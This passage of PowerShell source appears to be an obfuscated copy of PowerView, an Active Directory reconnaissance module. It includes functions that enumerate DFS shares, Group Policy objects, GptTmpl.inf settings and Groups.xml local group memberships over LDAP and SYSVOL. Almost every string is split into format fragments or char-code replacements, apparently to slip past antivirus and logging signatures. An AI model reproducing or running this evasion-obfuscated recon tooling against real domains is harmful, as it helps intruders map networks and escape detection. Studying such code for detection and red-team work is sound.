                $SearchScope = ("{0}{2}{1}"-f'S','btree','u'),

                [Int]
                $ResultPageSize = 200,

                [Int]
                $ServerTimeLimit,

                [Switch]
                $Tombstone,

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $Credential = [Management.Automation.PSCredential]::Empty
            )

            $DFSsearcher = Get-DomainSearcher @PSBoundParameters

            if ($DFSsearcher) {
                $DFSshares = @()
                $DFSsearcher.filter = ("{0}{6}{1}{4}{2}{5}{3}"-f'(&(o','ctCl','=','TDfs))','ass','f','bje')

                try {
                    $Results = $DFSSearcher.FindAll()
                    $Results | Where-Object {$_} | ForEach-Object {
                        $Properties = $_.Properties
                        $RemoteNames = $Properties.remoteservername
                        $Pkt = $Properties.pkt

                        $DFSshares += $RemoteNames | ForEach-Object {
                            try {
                                if ( $_.Contains('\') ) {
                                    New-Object -TypeName PSObject -Property @{("{1}{0}"-f 'me','Na')=$Properties.name[0];("{2}{0}{1}{3}"-f 'emo','teS','R','erverName')=$_.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose ('[Get'+'-'+'D'+'om'+'a'+'inDFSSha'+'re] '+'Get-Domai'+'n'+'D'+'FSShar'+'eV1 '+'er'+'ro'+'r '+'i'+'n '+'parsin'+'g'+' '+'D'+'FS '+'share'+' '+': '+"$_")
                            }
                        }
                    }
                    if ($Results) {
                        try { $Results.dispose() }
                        catch {
                            Write-Verbose ('[Get-D'+'oma'+'inD'+'F'+'S'+'Share]'+' '+'G'+'et-Doma'+'i'+'nDFSS'+'hareV1 '+'e'+'rror '+'disp'+'osin'+'g '+'o'+'f '+'th'+'e '+'Re'+'sul'+'ts '+'o'+'bject'+': '+"$_")
                        }
                    }
                    $DFSSearcher.dispose()

                    if ($pkt -and $pkt[0]) {
                        Parse-Pkt $pkt[0] | ForEach-Object {
                            
                            
                            
                            if ($_ -ne ("{0}{1}"-f'n','ull')) {
                                New-Object -TypeName PSObject -Property @{("{0}{1}"-f'Nam','e')=$Properties.name[0];("{2}{0}{1}" -f'er','Name','RemoteServ')=$_}
                            }
                        }
                    }
                }
                catch {
                    Write-Warning ('['+'Get'+'-Domain'+'D'+'FSS'+'hare] '+'Get-DomainD'+'F'+'SShar'+'eV1'+' '+'error'+' '+': '+"$_")
                }
                $DFSshares | Sort-Object -Unique -Property ("{2}{1}{0}" -f'ame','ServerN','Remote')
            }
        }

        function Get-DomainDFSShareV2 {
            [CmdletBinding()]
            Param(
                [String]
                $Domain,

                [String]
                $SearchBase,

                [String]
                $Server,

                [String]
                $SearchScope = ("{1}{0}{2}"-f'tr','Sub','ee'),

                [Int]
                $ResultPageSize = 200,

                [Int]
                $ServerTimeLimit,

                [Switch]
                $Tombstone,

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $Credential = [Management.Automation.PSCredential]::Empty
            )

            $DFSsearcher = Get-DomainSearcher @PSBoundParameters

            if ($DFSsearcher) {
                $DFSshares = @()
                $DFSsearcher.filter = (("{4}{1}{0}{5}{6}{3}{7}{2}{8}" -f 'ject','b','v2)','FS-L','(&(o','Clas','s=msD','ink',')'))
                $Null = $DFSSearcher.PropertiesToLoad.AddRange((("{0}{1}{2}{3}" -f'msdfs-lin','kpa','t','hv2'),("{4}{3}{0}{2}{1}"-f 'is','2','tv','argetL','msDFS-T')))

                try {
                    $Results = $DFSSearcher.FindAll()
                    $Results | Where-Object {$_} | ForEach-Object {
                        $Properties = $_.Properties
                        $target_list = $Properties.'msdfs-targetlistv2'[0]
                        $xml = [xml][System.Text.Encoding]::Unicode.GetString($target_list[2..($target_list.Length-1)])
                        $DFSshares += $xml.targets.ChildNodes | ForEach-Object {
                            try {
                                $Target = $_.InnerText
                                if ( $Target.Contains('\') ) {
                                    $DFSroot = $Target.split('\')[3]
                                    $ShareName = $Properties.'msdfs-linkpathv2'[0]
                                    New-Object -TypeName PSObject -Property @{("{0}{1}" -f 'N','ame')="$DFSroot$ShareName";("{3}{0}{1}{2}"-f 'mo','t','eServerName','Re')=$Target.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose ('[Get-'+'Dom'+'a'+'i'+'nDFSShare]'+' '+'Get-D'+'omainDFSS'+'har'+'eV2'+' '+'er'+'ror'+' '+'i'+'n '+'p'+'arsin'+'g '+'ta'+'r'+'get '+': '+"$_")
                            }
                        }
                    }
                    if ($Results) {
                        try { $Results.dispose() }
                        catch {
                            Write-Verbose ('[Ge'+'t'+'-'+'Domain'+'DF'+'SShare] '+'Er'+'ror '+'d'+'is'+'p'+'osing '+'o'+'f '+'th'+'e '+'Resu'+'lt'+'s '+'obje'+'c'+'t: '+"$_")
                        }
                    }
                    $DFSSearcher.dispose()
                }
                catch {
                    Write-Warning ('['+'Get-D'+'oma'+'inDFSShare]'+' '+'Get-DomainDF'+'S'+'ShareV2'+' '+'err'+'or '+': '+"$_")
                }
                $DFSshares | Sort-Object -Unique -Property ("{1}{2}{4}{3}{0}" -f'verName','Re','m','teSer','o')
            }
        }
    }

    PROCESS {
        $DFSshares = @()

        if ($PSBoundParameters[("{1}{0}"-f 'omain','D')]) {
            ForEach ($TargetDomain in $Domain) {
                $SearcherArguments[("{1}{0}" -f'omain','D')] = $TargetDomain
                if ($Version -match ((("{1}{2}{0}" -f'9SV1','al','l')) -cREpLacE'9SV',[chAR]124)) {
                    $DFSshares += Get-DomainDFSShareV1 @SearcherArguments
                }
                if ($Version -match ((("{1}{0}{2}"-f'O','allG','i2')).REpLACE(([ChAR]71+[ChAR]79+[ChAR]105),'|'))) {
                    $DFSshares += Get-DomainDFSShareV2 @SearcherArguments
                }
            }
        }
        else {
            if ($Version -match ((("{0}{1}"-f'al','lHuI1'))-CREPLACE  'HuI',[chAr]124)) {
                $DFSshares += Get-DomainDFSShareV1 @SearcherArguments
            }
            if ($Version -match ((("{1}{0}" -f 'll8Q62','a')) -cREpLaCE '8Q6',[CHAR]124)) {
                $DFSshares += Get-DomainDFSShareV2 @SearcherArguments
            }
        }

        $DFSshares | Sort-Object -Property (("{0}{3}{1}{2}" -f 'RemoteS','Na','me','erver'),("{0}{1}" -f'Na','me')) -Unique
    }
}








function Get-GptTmpl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{1}{0}" -f'uldProcess','ho','PSS'}, '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{3}{1}{4}{2}{0}"-f 'th','pcfi','pa','g','lesys'}, {"{1}{0}" -f'ath','P'})]
        [String]
        $GptTmplPath,

        [Switch]
        $OutputObject,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $MappedPaths = @{}
    }

    PROCESS {
        try {
            if (($GptTmplPath -Match ((("{2}{5}{1}{3}{0}{6}{4}"-f 'i7Li','i7Li7L','i7','i7L.*','.*','L','7L')).rePLACe('i7L',[STRing][Char]92))) -and ($PSBoundParameters[("{0}{1}{2}"-f 'Cre','denti','al')])) {
                $SysVolPath = "\\$((New-Object System.Uri($GptTmplPath)).Host)\SYSVOL "
                if (-not $MappedPaths[$SysVolPath]) {
                    
                    Add-RemoteConnection -Path $SysVolPath -Credential $Credential
                    $MappedPaths[$SysVolPath] = $True
                }
            }

            $TargetGptTmplPath = $GptTmplPath
            if (-not $TargetGptTmplPath.EndsWith(("{0}{1}" -f'.i','nf'))) {
                $TargetGptTmplPath += ((("{8}{13}{7}{2}{9}{11}{12}{5}{1}{6}{4}{3}{0}{10}"-f 'cEdi','T7','ros','Se','Z','N','d','7dZMic','7dZ','oft7dZWi','t7dZGptTmpl.inf','ndow','s ','MACHINE')).RePLaCE(([cHar]55+[cHar]100+[cHar]90),[stRinG][cHar]92))
            }

            Write-Verbose ('['+'Ge'+'t-GptTm'+'pl]'+' '+'P'+'arsing'+' '+'G'+'ptT'+'mplPa'+'th'+': '+"$TargetGptTmplPath")

            if ($PSBoundParameters[("{3}{1}{2}{0}" -f't','utput','Objec','O')]) {
                $Contents = Get-IniContent -Path $TargetGptTmplPath -OutputObject -ErrorAction Stop
                if ($Contents) {
                    $Contents | Add-Member Noteproperty ("{0}{1}"-f'P','ath') $TargetGptTmplPath
                    $Contents
                }
            }
            else {
                $Contents = Get-IniContent -Path $TargetGptTmplPath -ErrorAction Stop
                if ($Contents) {
                    $Contents[("{1}{0}" -f'ath','P')] = $TargetGptTmplPath
                    $Contents
                }
            }
        }
        catch {
            Write-Verbose ('[Ge'+'t-GptTm'+'pl] '+'Error'+' '+'parsin'+'g '+"$TargetGptTmplPath "+': '+"$_")
        }
    }

    END {
        
        $MappedPaths.Keys | ForEach-Object { Remove-RemoteConnection -Path $_ }
    }
}


function Get-GroupsXML {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{3}{2}{1}{0}" -f's','s','dProce','houl','PSS'}, '')]
    [OutputType({"{0}{4}{3}{5}{2}{1}"-f'P','L','psXM','rView.G','owe','rou'})]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{1}{0}" -f 'th','Pa'})]
        [String]
        $GroupsXMLPath,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $MappedPaths = @{}
    }

    PROCESS {
        try {
            if (($GroupsXMLPath -Match ((("{1}{4}{3}{6}{5}{2}{0}" -f '}.*','{','0}.*{0}{0','{0}','0}','}{','{0')) -F[chaR]92)) -and ($PSBoundParameters[("{2}{0}{1}" -f 'e','dential','Cr')])) {
                $SysVolPath = "\\$((New-Object System.Uri($GroupsXMLPath)).Host)\SYSVOL "
                if (-not $MappedPaths[$SysVolPath]) {
                    
                    Add-RemoteConnection -Path $SysVolPath -Credential $Credential
                    $MappedPaths[$SysVolPath] = $True
                }
            }

            [XML]$GroupsXMLcontent = Get-Content -Path $GroupsXMLPath -ErrorAction Stop

            
            $GroupsXMLcontent | Select-Xml ("{1}{0}{2}" -f'ups/Grou','/Gro','p') | Select-Object -ExpandProperty node | ForEach-Object {

                $Groupname = $_.Properties.groupName

                
                $GroupSID = $_.Properties.groupSid
                if (-not $GroupSID) {
                    if ($Groupname -match ("{3}{0}{4}{2}{1}" -f 'dministra','s','or','A','t')) {
                        $GroupSID = ("{3}{2}{1}{0}" -f '544','2-','-5-3','S-1')
                    }
                    elseif ($Groupname -match ("{4}{1}{0}{3}{2}"-f'k','e Des','p','to','Remot')) {
                        $GroupSID = ("{3}{2}{1}{0}" -f '5','5','2-5','S-1-5-3')
                    }
                    elseif ($Groupname -match ("{1}{2}{0}"-f 's','G','uest')) {
                        $GroupSID = ("{1}{0}{3}{2}" -f'3','S-1-5-','6','2-54')
                    }
                    else {
                        if ($PSBoundParameters[("{2}{1}{0}" -f'ial','nt','Crede')]) {
                            $GroupSID = ConvertTo-SID -ObjectName $Groupname -Credential $Credential
                        }
                        else {
                            $GroupSID = ConvertTo-SID -ObjectName $Groupname
                        }
                    }
                }

                
                $Members = $_.Properties.members | Select-Object -ExpandProperty Member | Where-Object { $_.action -match 'ADD' } | ForEach-Object {
                    if ($_.sid) { $_.sid }
                    else { $_.name }
                }

                if ($Members) {
                    
                    if ($_.filters) {
                        $Filters = $_.filters.GetEnumerator() | ForEach-Object {
                            New-Object -TypeName PSObject -Property @{("{1}{0}"-f 'ype','T') = $_.LocalName;("{0}{1}" -f'V','alue') = $_.name}
                        }
                    }
                    else {
                        $Filters = $Null
                    }

                    if ($Members -isnot [System.Array]) { $Members = @($Members) }

                    $GroupsXML = New-Object PSObject
                    $GroupsXML | Add-Member Noteproperty ("{2}{1}{0}"-f 'h','at','GPOP') $TargetGroupsXMLPath
                    $GroupsXML | Add-Member Noteproperty ("{2}{1}{0}"-f'ers','lt','Fi') $Filters
                    $GroupsXML | Add-Member Noteproperty ("{1}{2}{0}" -f'e','Gr','oupNam') $GroupName
                    $GroupsXML | Add-Member Noteproperty ("{1}{0}" -f 'upSID','Gro') $GroupSID
                    $GroupsXML | Add-Member Noteproperty ("{1}{2}{4}{3}{0}"-f'f','G','roup','O','Member') $Null
                    $GroupsXML | Add-Member Noteproperty ("{2}{3}{1}{0}"-f'bers','em','Group','M') $Members
                    $GroupsXML.PSObject.TypeNames.Insert(0, ("{4}{1}{3}{2}{0}" -f 'sXML','owerVie','up','w.Gro','P'))
                    $GroupsXML
                }
            }
        }
        catch {
            Write-Verbose ('['+'G'+'et-Gr'+'ou'+'psXML]'+' '+'Erro'+'r'+' '+'p'+'ar'+'sing '+"$TargetGroupsXMLPath "+': '+"$_")
        }
    }

    END {
        
        $MappedPaths.Keys | ForEach-Object { Remove-RemoteConnection -Path $_ }
    }
}


function Get-DomainGPO {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{3}{1}" -f'P','ocess','SShould','Pr'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{2}{5}{3}{0}{1}" -f'men','ts','VarsMoreThanAss','gn','PSUseDeclared','i'}, '')]
    [OutputType({"{2}{1}{3}{0}"-f 'PO','.','PowerView','G'})]
    [OutputType({"{2}{3}{1}{0}"-f 'w.GPO.Raw','rVie','P','owe'})]
    [CmdletBinding(DefaultParameterSetName = {"{1}{0}"-f 'ne','No'})]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{1}{3}{0}{2}{4}" -f 'uishe','Di','dNa','sting','me'}, {"{2}{4}{3}{0}{1}" -f't','Name','SamA','n','ccou'}, {"{1}{0}" -f 'ame','N'})]
        [String[]]
        $Identity,

        [Parameter(ParameterSetName = "COm`PuTE`RId`EnTi`TY")]
        [Alias({"{0}{2}{1}" -f'Co','ame','mputerN'})]
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerIdentity,

        [Parameter(ParameterSetName = "uSeRidE`N`TI`TY")]
        [Alias({"{0}{1}"-f 'U','serName'})]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f 'ilter','F'})]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}"-f'ADS','ath','P'})]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{3}{1}{2}{0}"-f 'oller','Cont','r','in','Doma'})]
        [String]
        $Server,

        [ValidateSet({"{0}{1}" -f'Ba','se'}, {"{1}{2}{0}"-f'vel','O','neLe'}, {"{0}{2}{1}" -f 'S','tree','ub'})]
        [String]
        $SearchScope = ("{1}{0}" -f 'ee','Subtr'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet({"{1}{0}" -f 'acl','D'}, {"{1}{0}" -f'roup','G'}, {"{1}{0}" -f'e','Non'}, {"{0}{1}" -f 'O','wner'}, {"{1}{0}"-f 'cl','Sa'})]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias({"{3}{1}{2}{0}" -f'urnOne','e','t','R'})]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters[("{2}{0}{1}" -f 'i','n','Doma')]) { $SearcherArguments[("{1}{0}"-f 'n','Domai')] = $Domain }
        if ($PSBoundParameters[("{1}{0}{2}"-f'pert','Pro','ies')]) { $SearcherArguments[("{1}{2}{0}"-f's','Proper','tie')] = $Properties }
        if ($PSBoundParameters[("{0}{2}{1}" -f'Sear','Base','ch')]) { $SearcherArguments[("{1}{2}{0}" -f'se','Sea','rchBa')] = $SearchBase }
        if ($PSBoundParameters[("{0}{1}" -f 'Serv','er')]) { $SearcherArguments[("{1}{0}" -f'r','Serve')] = $Server }
        if ($PSBoundParameters[("{1}{2}{3}{0}"-f'cope','Searc','h','S')]) { $SearcherArguments[("{2}{1}{0}" -f 'chScope','r','Sea')] = $SearchScope }
        if ($PSBoundParameters[("{1}{0}{2}{3}"-f'ultPage','Res','S','ize')]) { $SearcherArguments[("{0}{1}{3}{2}"-f'ResultP','a','e','geSiz')] = $ResultPageSize }
        if ($PSBoundParameters[("{3}{0}{2}{1}"-f 'erverTim','Limit','e','S')]) { $SearcherArguments[("{0}{2}{3}{1}" -f 'Serve','mit','rTime','Li')] = $ServerTimeLimit }
        if ($PSBoundParameters[("{0}{1}{2}{4}{3}" -f'S','ecu','rit','sks','yMa')]) { $SearcherArguments[("{0}{1}{2}"-f'S','e','curityMasks')] = $SecurityMasks }
        if ($PSBoundParameters[("{1}{2}{0}" -f'one','To','mbst')]) { $SearcherArguments[("{1}{2}{0}"-f 'one','Tom','bst')] = $Tombstone }
        if ($PSBoundParameters[("{0}{1}{2}"-f'Credenti','a','l')]) { $SearcherArguments[("{0}{1}{2}"-f 'Cre','d','ential')] = $Credential }
        $GPOSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($GPOSearcher) {
            if ($PSBoundParameters[("{2}{0}{4}{3}{1}"-f'pu','ntity','Com','erIde','t')] -or $PSBoundParameters[("{1}{0}{2}" -f 'rIde','Use','ntity')]) {
                $GPOAdsPaths = @()
                if ($SearcherArguments[("{0}{2}{1}"-f 'Prope','ties','r')]) {
                    $OldProperties = $SearcherArguments[("{3}{2}{0}{1}" -f'er','ties','p','Pro')]
                }
                $SearcherArguments[("{2}{0}{1}" -f'oper','ties','Pr')] = ("{7}{4}{2}{5}{6}{0}{1}{3}"-f ',d','nsho','shedna','stname','ingui','m','e','dist')
                $TargetComputerName = $Null

                if ($PSBoundParameters[("{3}{0}{1}{2}"-f'terIden','tit','y','Compu')]) {
                    $SearcherArguments[("{1}{0}{2}" -f 'nti','Ide','ty')] = $ComputerIdentity
                    $Computer = Get-DomainComputer @SearcherArguments -FindOne | Select-Object -First 1
                    if(-not $Computer) {
                        Write-Verbose ('['+'Get-D'+'omai'+'nGPO'+'] '+'C'+'o'+'mputer '+"'$ComputerIdentity' "+'no'+'t '+'fou'+'nd'+'!')
                    }
                    $ObjectDN = $Computer.distinguishedname
                    $TargetComputerName = $Computer.dnshostname
                }
                else {
                    $SearcherArguments[("{1}{0}{2}" -f'nti','Ide','ty')] = $UserIdentity
                    $User = Get-DomainUser @SearcherArguments -FindOne | Select-Object -First 1
                    if(-not $User) {
                        Write-Verbose ('[Get-'+'D'+'omain'+'GPO'+'] '+'Use'+'r '+"'$UserIdentity' "+'no'+'t '+'foun'+'d!')
                    }
                    $ObjectDN = $User.distinguishedname
                }

                
                $ObjectOUs = @()
                $ObjectOUs += $ObjectDN.split(',') | ForEach-Object {
                    if($_.startswith('OU=')) {
                        $ObjectDN.SubString($ObjectDN.IndexOf("$($_),"))
                    }
                }
                Write-Verbose ('[Get-Domain'+'GPO'+'] '+'o'+'b'+'ject '+'OU'+'s: '+"$ObjectOUs")

                if ($ObjectOUs) {
                    
                    $SearcherArguments.Remove(("{0}{2}{1}"-f 'Pro','ties','per'))
                    $InheritanceDisabled = $False
                    ForEach($ObjectOU in $ObjectOUs) {
                        $SearcherArguments[("{1}{2}{0}"-f'ty','I','denti')] = $ObjectOU
                        $GPOAdsPaths += Get-DomainOU @SearcherArguments | ForEach-Object {
                            
                            if ($_.gplink) {
                                $_.gplink.split('][') | ForEach-Object {
                                    if ($_.startswith(("{1}{0}"-f 'P','LDA'))) {
                                        $Parts = $_.split(';')
                                        $GpoDN = $Parts[0]
                                        $Enforced = $Parts[1]

                                        if ($InheritanceDisabled) {
                                            
                                            
                                            if ($Enforced -eq 2) {
                                                $GpoDN
                                            }
                                        }
                                        else {
                                            
                                            $GpoDN
                                        }
                                    }
                                }
                            }

                            
                            if ($_.gpoptions -eq 1) {
                                $InheritanceDisabled = $True
                            }
                        }
                    }
                }

                if ($TargetComputerName) {
                    
                    $ComputerSite = (Get-NetComputerSiteName -ComputerName $TargetComputerName).SiteName
                    if($ComputerSite -and ($ComputerSite -notlike ("{0}{2}{1}" -f 'E','r*','rro'))) {
                        $SearcherArguments[("{2}{0}{1}"-f't','ity','Iden')] = $ComputerSite
                        $GPOAdsPaths += Get-DomainSite @SearcherArguments | ForEach-Object {
                            if($_.gplink) {
                                
                                $_.gplink.split('][') | ForEach-Object {
                                    if ($_.startswith(("{0}{1}"-f 'L','DAP'))) {
                                        $_.split(';')[0]
                                    }
                                }
                            }
                        }
                    }
                }

                
                $ObjectDomainDN = $ObjectDN.SubString($ObjectDN.IndexOf('DC='))
                $SearcherArguments.Remove(("{2}{0}{1}"-f 'tit','y','Iden'))
                $SearcherArguments.Remove(("{0}{1}{2}" -f'Prop','ertie','s'))
                $SearcherArguments[("{0}{1}{2}"-f 'LDA','PFi','lter')] = "(objectclass=domain)(distinguishedname=$ObjectDomainDN)"
                $GPOAdsPaths += Get-DomainObject @SearcherArguments | ForEach-Object {
                    if($_.gplink) {
                        
                        $_.gplink.split('][') | ForEach-Object {
                            if ($_.startswith(("{0}{1}"-f'L','DAP'))) {
                                $_.split(';')[0]
                            }
                        }
                    }
                }
                Write-Verbose ('[Get'+'-'+'D'+'omain'+'GPO'+'] '+'GPOAdsPa'+'ths'+': '+"$GPOAdsPaths")

                
                if ($OldProperties) { $SearcherArguments[("{0}{2}{1}"-f 'P','operties','r')] = $OldProperties }
                else { $SearcherArguments.Remove(("{1}{3}{0}{2}" -f 'pert','P','ies','ro')) }
                $SearcherArguments.Remove(("{1}{0}"-f'tity','Iden'))

                $GPOAdsPaths | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
                    
                    $SearcherArguments[("{0}{2}{1}"-f'S','ase','earchB')] = $_
                    $SearcherArguments[("{1}{3}{2}{0}"-f 'r','LDAPFil','e','t')] = ("{0}{4}{5}{3}{7}{2}{6}{1}" -f '(o','iner)','oupPol','tCategor','bj','ec','icyConta','y=gr')
                    Get-DomainObject @SearcherArguments | ForEach-Object {
                        if ($PSBoundParameters['Raw']) {
                            $_.PSObject.TypeNames.Insert(0, ("{5}{0}{2}{1}{3}{4}"-f'i','w.G','e','PO','.Raw','PowerV'))
                        }
                        else {
                            $_.PSObject.TypeNames.Insert(0, ("{1}{0}{2}"-f 'iew.GP','PowerV','O'))
                        }
                        $_
                    }
                }
            }
            else {
                $IdentityFilter = ''
                $Filter = ''
                $Identity | Where-Object {$_} | ForEach-Object {
                    $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($IdentityInstance -match ((("{3}{0}{2}{1}{4}"-f':/','XM','/','LDAP','N^CN=.*')) -RePLACE([ChaR]88+[ChaR]77+[ChaR]78),[ChaR]124)) {
                        $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                        if ((-not $PSBoundParameters[("{0}{1}"-f 'Do','main')]) -and (-not $PSBoundParameters[("{0}{1}{2}" -f 'S','e','archBase')])) {
                            
                            
                            $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose ('[G'+'e'+'t-Domain'+'G'+'PO] '+'Ext'+'ra'+'cted '+'domai'+'n '+"'$IdentityDomain' "+'fr'+'om '+"'$IdentityInstance'")
                            $SearcherArguments[("{1}{0}"-f'in','Doma')] = $IdentityDomain
                            $GPOSearcher = Get-DomainSearcher @SearcherArguments
                            if (-not $GPOSearcher) {
                                Write-Warning ('[Get-'+'D'+'omainGPO'+']'+' '+'U'+'n'+'able '+'t'+'o '+'retrieve'+' '+'do'+'main '+'sea'+'rc'+'her '+'fo'+'r '+"'$IdentityDomain'")
                            }
                        }
                    }
                    elseif ($IdentityInstance -match '{.*}') {
                        $IdentityFilter += "(name=$IdentityInstance)"
                    }
                    else {
                        try {
                            $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace (("{1}{0}"-f ')','(..')),'\$1'
                            $IdentityFilter += "(objectguid=$GuidByteString)"
                        }
                        catch {
                            $IdentityFilter += "(displayname=$IdentityInstance)"
                        }
                    }
                }
                if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                    $Filter += "(|$IdentityFilter)"
                }

                if ($PSBoundParameters[("{2}{3}{1}{0}"-f'er','lt','LD','APFi')]) {
                    Write-Verbose ('['+'Get-Doma'+'in'+'GPO]'+' '+'Usi'+'ng '+'additio'+'nal'+' '+'LD'+'AP '+'fil'+'te'+'r: '+"$LDAPFilter")
                    $Filter += "$LDAPFilter"
                }

                $GPOSearcher.filter = "(&(objectCategory=groupPolicyContainer)$Filter)"
                Write-Verbose "[Get-DomainGPO] filter string: $($GPOSearcher.filter) "

                if ($PSBoundParameters[("{1}{0}{2}"-f'indO','F','ne')]) { $Results = $GPOSearcher.FindOne() }
                else { $Results = $GPOSearcher.FindAll() }
                $Results | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters['Raw']) {
                        
                        $GPO = $_
                        $GPO.PSObject.TypeNames.Insert(0, ("{2}{0}{1}{4}{3}"-f'V','iew.GPO.R','Power','w','a'))
                    }
                    else {
                        if ($PSBoundParameters[("{0}{1}{2}" -f'S','e','archBase')] -and ($SearchBase -Match ("{1}{0}" -f'C://','^G'))) {
                            $GPO = Convert-LDAPProperty -Properties $_.Properties
                            try {
                                $GPODN = $GPO.distinguishedname
                                $GPODomain = $GPODN.SubString($GPODN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                                $gpcfilesyspath = "\\$GPODomain\SysVol\$GPODomain\Policies\$($GPO.cn)"
                                $GPO | Add-Member Noteproperty ("{1}{2}{0}{3}" -f 't','gpcfilesy','spa','h') $gpcfilesyspath
                            }
                            catch {
                                Write-Verbose "[Get-DomainGPO] Error calculating gpcfilesyspath for: $($GPO.distinguishedname) "
                            }
                        }
                        else {
                            $GPO = Convert-LDAPProperty -Properties $_.Properties
                        }
                        $GPO.PSObject.TypeNames.Insert(0, ("{2}{1}{0}"-f 'GPO','erView.','Pow'))
                    }
                    $GPO
                }
                if ($Results) {
                    try { $Results.dispose() }
                    catch {
                        Write-Verbose ('[G'+'et-D'+'om'+'ainGPO]'+' '+'Er'+'r'+'or '+'dis'+'posing'+' '+'of'+' '+'the'+' '+'R'+'esults'+' '+'ob'+'ject:'+' '+"$_")
                    }
                }
                $GPOSearcher.dispose()
            }
        }
    }
}


function Get-DomainGPOLocalGroup {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{2}{1}" -f'PS','ss','oce','ShouldPr'}, '')]
    [OutputType({"{2}{3}{4}{0}{1}{5}"-f 'rVie','w.GPOGr','P','o','we','oup'})]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{1}{3}{0}{2}"-f'hed','Distingu','Name','is'}, {"{4}{3}{2}{1}{0}"-f 'e','m','a','ountN','SamAcc'}, {"{1}{0}"-f 'e','Nam'})]
        [String[]]
        $Identity,

        [Switch]
        $ResolveMembersToSIDs,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f 'er','Filt'})]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}"-f'ath','A','DSP'})]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}{3}" -f'DomainCont','rol','le','r'})]
        [String]
        $Server,

        [ValidateSet({"{1}{0}" -f 'ase','B'}, {"{2}{1}{0}"-f'l','eve','OneL'}, {"{1}{2}{0}"-f 'btree','S','u'})]
        [String]
        $SearchScope = ("{1}{0}" -f 'btree','Su'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters[("{0}{1}" -f'Doma','in')]) { $SearcherArguments[("{1}{0}" -f 'omain','D')] = $Domain }
        if ($PSBoundParameters[("{2}{0}{1}" -f'PFilt','er','LDA')]) { $SearcherArguments[("{0}{1}{2}"-f'L','DAPF','ilter')] = $Domain }
        if ($PSBoundParameters[("{2}{0}{1}" -f'hBa','se','Searc')]) { $SearcherArguments[("{2}{0}{1}" -f'as','e','SearchB')] = $SearchBase }
        if ($PSBoundParameters[("{2}{1}{0}" -f'r','e','Serv')]) { $SearcherArguments[("{2}{1}{0}"-f'er','v','Ser')] = $Server }
        if ($PSBoundParameters[("{2}{1}{0}" -f'e','rchScop','Sea')]) { $SearcherArguments[("{0}{1}{2}" -f'Searc','hSc','ope')] = $SearchScope }
        if ($PSBoundParameters[("{0}{4}{3}{1}{2}" -f 'Resu','age','Size','tP','l')]) { $SearcherArguments[("{1}{2}{3}{4}{0}"-f 'Size','Re','sultPa','g','e')] = $ResultPageSize }
        if ($PSBoundParameters[("{3}{1}{0}{2}{4}"-f'e','erverTim','Limi','S','t')]) { $SearcherArguments[("{2}{1}{0}"-f 'rTimeLimit','ve','Ser')] = $ServerTimeLimit }
